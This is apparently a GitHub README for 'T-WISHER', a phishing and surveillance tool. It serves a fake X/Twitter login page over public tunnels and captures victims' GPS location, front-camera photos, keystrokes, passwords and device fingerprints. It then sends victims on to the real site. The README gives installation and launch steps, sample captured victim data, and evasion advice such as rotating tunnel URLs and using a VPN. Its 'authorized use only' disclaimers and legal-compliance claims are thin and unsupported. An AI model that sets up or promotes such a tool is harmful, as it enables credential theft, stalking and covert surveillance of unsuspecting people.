<div align="center">
  <!-- Add your logo here -->
  <img src="https://iili.io/qngcHj1.jpg" alt="T-WISHER Logo" width="760"/>
  
  # 🔵 T-WISHER
  ## Advanced Surveillance & Intelligence Gathering Framework
  ### PEGASUS TURBO v1.0
  
  **MADE BY XSPEEN**  
  **AUTHOR: WHITE HACKER / RED TEAM COMMUNITY**
  
  [![Version](https://img.shields.io/badge/version-PEGASUS_TURBO_v1.0-red?style=for-the-badge)]()
  [![Author](https://img.shields.io/badge/author-XSPEEN-blue?style=for-the-badge)]()
  [![License](https://img.shields.io/badge/license-Educational_Only-red?style=for-the-badge)]()
  [![Platform](https://img.shields.io/badge/platform-Termux%20%7C%20Linux%20%7C%20Windows%20%7C%20macOS-green?style=for-the-badge)]()
</div>

---

## ⚠️ CRITICAL ACCESS WARNING

<div style="border: 2px solid red; padding: 20px; border-radius: 10px; background-color: #1a0000;">

**BEFORE USING THIS TOOL, YOU MUST ACKNOWLEDGE:**

This is a **SURVEILLANCE PEGASUS TOOL** designed exclusively for:
- 🛡️ **Red Team Operations** (Authorized)
- ⚪ **White Hacker Hunting** (Law Enforcement)
- 🎯 **Tracking Black Hat Hackers** who ruin people's lives
- ✅ **Authorized Security Assessments**

### 🔐 ACCESS CATEGORIES:

You **MUST** belong to ONE of these categories:
| Category | Authorization Level |
|----------|-------------------|
| 👮 Law Enforcement Official | Federal/State Level |
| 🔴 Authorized Red Team Member | Written Pentest Contract |
| ⚪ White Hat Hacker | Written Permission |
| 🔬 Security Researcher | Legal Authorization |
| 🏛️ Government Intelligence | Agency Clearance |

### 📊 DATA THIS TOOL COLLECTS:
| Data Type | Method | Format |
|-----------|--------|--------|
| 📍 GPS Coordinates | Forced location access | Latitude/Longitude |
| 📸 Front Camera Images | Automatic capture | JPEG with timestamp |
| ⌨️ Keylogger Data | All keystrokes | Text with timestamps |
| 🔑 Login Credentials | Form capture | Email/Password |
| 🌐 IP Address & Geolocation | Network analysis | IPv4/IPv6 + Location |
| 📱 Device Information | Fingerprinting | OS, Browser, Model |
| 🗺️ Google Maps Link | Coordinate conversion | Direct clickable link |
| 🖥️ Browser Fingerprinting | Canvas/WebGL | Unique browser ID |

> **⚠️ By using this tool, you accept FULL LEGAL RESPONSIBILITY. Unauthorized use is a FEDERAL CRIME.**

</div>

---

## 🚀 FEATURES

<div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">

| Feature | Description |
|---------|-------------|
| 📍 **Location Hijacking** | Forces GPS access, captures latitude/longitude with high accuracy |
| 📸 **Camera Capture** | Automatically takes front camera screenshot with timestamp |
| ⌨️ **Keylogger** | Records all keystrokes including passwords and special keys |
| 🔑 **Credential Harvesting** | Captures emails and passwords in real-time |
| 🌐 **IP Tracking** | Full IP address with geolocation and ISP info |
| 📱 **Device Fingerprinting** | OS, browser, screen resolution, device model, battery status |
| 🗺️ **Google Maps Integration** | Direct clickable location link with street view |
| 🔌 **Multiple Tunneling Options** | 5 different servers (Localhost, Ngrok, Serveo.net, Cloudflared, SSH) |
| 📲 **QR Code Generation** | Mobile access ready for each tunnel |
| 📊 **Real-time Monitoring** | Live victim data display with colored output |
| 🎭 **X/Twitter Replica** | Professional phishing interface |
| 🔄 **Auto-Redirect** | Victims sent to real Twitter after capture |

</div>

---

## 📋 PREREQUISITES

### Required Python Packages
```bash
pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama
```

---

💻 SYSTEM INSTALLATION

<details>
<summary><b>📱 Termux (Android)</b></summary>

```bash
pkg update && pkg upgrade
pkg install python python-pip git curl wget openssh
pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama
```

</details>

<details>
<summary><b>🐉 Kali Linux</b></summary>

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Cloudflared installation
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
```

</details>

<details>
<summary><b>🦜 Parrot OS</b></summary>

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Cloudflared
sudo apt install cloudflared
```

</details>

<details>
<summary><b>🐧 Ubuntu</b></summary>

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Cloudflared
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
```

</details>

<details>
<summary><b>📦 Arch Linux</b></summary>

```bash
sudo pacman -S python python-pip git curl wget
pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Cloudflared
yay -S cloudflared
```

</details>

<details>
<summary><b>🪟 Windows PowerShell</b></summary>

```powershell
# Install Python from python.org first
pip install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Download cloudflared
Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
```

</details>

<details>
<summary><b>🍎 macOS</b></summary>

```bash
# Install Homebrew first
brew install python3
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy colorama

# Cloudflared
brew install cloudflared
```

</details>

---

🔧 INSTALLATION

```bash
# Clone the repository
git clone https://github.com/xspeen/T-WISHER.git
cd T-WISHER

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x t-wisher.py

# Create required directories
mkdir -p data/victims data/images data/locations logs
```

---

🎯 USAGE

Launch T-WISHER

Platform Command
📱 Termux python t-wisher.py
🐉 Kali/Parrot/Ubuntu/Arch python3 t-wisher.py
🪟 Windows python t-wisher.py
🍎 macOS python3 t-wisher.py

Step-by-Step Walkthrough

1. Accept Terms

```
┌────────────────────────────────────┐
│         T-WISHER ACTIVATED          │
│     PEGASUS TURBO v1.0 LOADED       │
└────────────────────────────────────┘

[!] WARNING: This is a SURVEILLANCE tool for AUTHORIZED use only!
[!] Unauthorized use is a FEDERAL CRIME!

[?] Do you belong to authorized category? (yes/no): 
```

Type yes to continue

2. Select Category

```
[+] Select your authorization category:
    1. Law Enforcement Official
    2. Red Team Member (Authorized)
    3. White Hat Hacker (Written Consent)
    4. Security Researcher (Legal Authorization)
    5. Government Intelligence

[?] Enter category (1-5):
```

3. Configure Port

```
[?] Enter port for hunt (default: 8080): 
```

4. Select Tunnel Method

```
[+] Select tunnel method:
    1. Localhost (local network only)
    2. Ngrok (public URL)
    3. Serveo.net (SSH tunneling)
    4. Cloudflared Tunnel
    5. SSH Localhost.run

[?] Enter choice (1-5):
```

5. Start Hunting

```
[+] T-WISHER hunt mode ACTIVE
[+] Server running on port 8080
[+] Local URL: http://localhost:8080
[+] Network URL: http://192.168.1.100:8080
[+] Public URL: https://random-name.serveo.net
[+] QR Code saved: tunnel_qr_serveo.png

[+] Waiting for victims...
[+] Camera capture enabled
[+] Location hijacking active
[+] Keylogger running
[+] Continuous tracking enabled
```

---

📊 LIVE DATA CAPTURE

When victim accesses the page, you'll see real-time output:

```
[+] NEW VICTIM CONNECTED!
    IP: 192.168.1.105
    Device: iPhone 14 Pro
    Browser: Safari 16.0
    OS: iOS 16.2

📍 LOCATION ACCESS GRANTED
    Latitude: 40.7128° N
    Longitude: -74.0060° W
    Accuracy: 5 meters
    Google Maps: https://maps.google.com/?q=40.7128,-74.0060
    City: New York
    Country: USA
    Timezone: America/New_York

📸 CAMERA CAPTURE SUCCESSFUL
    Image saved: data/images/cam_1678901234.jpg
    Resolution: 1280x720
    Timestamp: 2024-01-01 12:00:05

🔑 CREDENTIALS CAPTURED
    Email: victim@gmail.com
    Password: secret123
    Login Time: 2024-01-01 12:00:10

⌨️ KEYLOGGER DATA
    Keystrokes saved: data/victims/keys_1678901234.txt
    Total keystrokes: 150

📱 DEVICE INFO
    Screen: 1170x2532
    Timezone: America/New_York
    Language: en-US
    Battery: 85% (Charging)
    Network: 4G - 25 Mbps
```

---

📁 OUTPUT FILES STRUCTURE

```
T-WISHER/
├── 📂 data/
│   ├── 📂 victims/
│   │   ├── 📄 victim_1678901234.json     # Complete victim data
│   │   ├── 📄 victim_1678901235.json
│   │   └── 📄 keys_1678901234.txt         # Keylogger data
│   ├── 📂 images/
│   │   ├── 🖼️ cam_1678901234.jpg          # Camera captures
│   │   └── 🖼️ cam_1678901235.jpg
│   └── 📂 locations/
│       ├── 📄 gps_1678901234.txt           # GPS coordinates
│       └── 📄 location_1678901234.json
├── 📂 logs/
│   └── 📄 t-wisher.log                     # Activity log
├── 📄 tunnel_qr_ngrok.png                   # QR codes for access
├── 📄 tunnel_qr_serveo.png
├── 📄 tunnel_qr_cloudflared.png
└── 📄 tunnel_qr_sshlocal.png
```

---

📝 VICTIM DATA FORMAT

```json
{
  "timestamp": "2024-01-01 12:00:00",
  "victim_id": "1678901234",
  "ip_address": "192.168.1.105",
  "port": 54321,
  "location": {
    "latitude": 40.7128,
    "longitude": -74.0060,
    "accuracy": 5,
    "altitude": 10.5,
    "heading": 180,
    "speed": 0,
    "google_maps": "https://maps.google.com/?q=40.7128,-74.0060",
    "city": "New York",
    "country": "USA",
    "timezone": "America/New_York"
  },
  "device": {
    "os": "iOS 16.2",
    "browser": "Safari 16.0",
    "device_model": "iPhone 14 Pro",
    "screen_resolution": "1170x2532",
    "color_depth": 24,
    "timezone": "America/New_York",
    "language": "en-US",
    "languages": ["en-US", "en"],
    "hardware_concurrency": 6,
    "device_memory": 4,
    "battery": {
      "level": 85,
      "charging": true
    },
    "network": {
      "type": "4g",
      "downlink": 25,
      "rtt": 50
    }
  },
  "camera": {
    "captured": true,
    "image_path": "data/images/cam_1678901234.jpg",
    "timestamp": "1678901234",
    "resolution": "1280x720"
  },
  "credentials": {
    "email": "victim@gmail.com",
    "password": "secret123",
    "capture_time": "1678901235"
  },
  "keylogger": {
    "file": "data/victims/keys_1678901234.txt",
    "keystrokes": 150,
    "first_key": "2024-01-01 12:00:01",
    "last_key": "2024-01-01 12:00:30"
  }
}
```

---

🔧 TROUBLESHOOTING

Common Issues & Solutions

Issue Solution
Ngrok not connecting ngrok authtoken YOUR_TOKEN (get from ngrok.com)
Cloudflared error cloudflared tunnel --url http://localhost:8080
Port already in use Linux: sudo fuser -k 8080/tcp Windows: netstat -ano \| findstr :8080 then taskkill /PID <PID> /F
Permission denied chmod +x t-wisher.py
Serveo.net not generating Manual: ssh -R 80:localhost:8080 serveo.net
Module not found pip install -r requirements.txt
Template error Ensure templates/ directory exists with index.html

---

🛡️ SECURITY MEASURES

1. 🔒 Always use VPN/Proxy for anonymity
2. 🗑️ Delete captured data after authorized operation
3. 🔐 Encrypt stored victim data with AES-256
4. 🔄 Use different tunnel URLs daily
5. 📊 Monitor logs for detection signatures
6. 🚫 Never share captured data publicly
7. 📱 Use isolated testing environments
8. ⏱️ Set automatic data expiration

---

⚖️ LEGAL COMPLIANCE

This tool complies with:

· Computer Fraud and Abuse Act (CFAA)
· GDPR Data Protection Regulations
· Local Cybercrime Laws
· Law Enforcement Protocols
· Authorized Penetration Testing Standards
· ISO 27001 Security Guidelines

---

👥 TEAM

Role Name Contribution
Author XSPEEN Core Architecture & Development
Community White Hacker Security Research
Community Red Team Operational Testing
Engine PEGASUS TURBO v1.0 Surveillance Framework

---

📞 CONTACT

For authorized operations and collaboration:

· GitHub: @XSPEEN
· Community: White Hacker / Red Team
· Issues: GitHub Issues

---

📜 DISCLAIMER

<div style="border: 1px solid #ff0000; padding: 20px; border-radius: 5px; background-color: #2d0000;">

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. THE AUTHORS ASSUME NO LIABILITY FOR ANY DAMAGES ARISING FROM THE USE OF THIS SOFTWARE.

UNAUTHORIZED USE MAY RESULT IN:

· Federal Criminal Charges
· Civil Liability
· Imprisonment (up to 20 years)
· Fines up to $250,000

By using this tool, you agree to:

1. Use only on authorized systems
2. Comply with all applicable laws
3. Accept full legal responsibility
4. Not use for illegal purposes
5. Report any misuse to authorities

</div>

---

<div align="center">

⚡ Remember: This is a surveillance weapon. Use only with legal authorization. ⚡

---

⭐ Star this repository if you find it useful for authorized security testing ⭐

https://img.shields.io/github/stars/xspeen/T-WISHER?style=social
https://img.shields.io/github/forks/xspeen/T-WISHER?style=social
https://img.shields.io/github/watchers/xspeen/T-WISHER?style=social

© 2024 XSPEEN | White Hacker/Red Team Community. All Rights Reserved.

</div>
```
